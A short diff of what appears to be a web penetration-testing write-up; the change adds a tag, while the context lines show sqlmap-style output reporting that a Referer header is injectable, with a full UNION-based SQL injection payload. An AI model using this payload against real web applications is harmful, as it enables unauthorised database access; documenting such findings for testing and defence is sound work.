@@ -28,6 +28,7 @@ Parameter: Referer (Referer)
     Type: UNION query
     Title: Generic UNION query (random number) - 2 columns
     Payload: -5848 UNION ALL SELECT CONCAT(0x7171787a71,0x6543727846745555584e4546736d6442655a6c63646a786c626d6f634b6e6f4c43554a6a4b746676,0x7170787871),3313-- -
+tags: [web渗透]
 ---
 ```
 
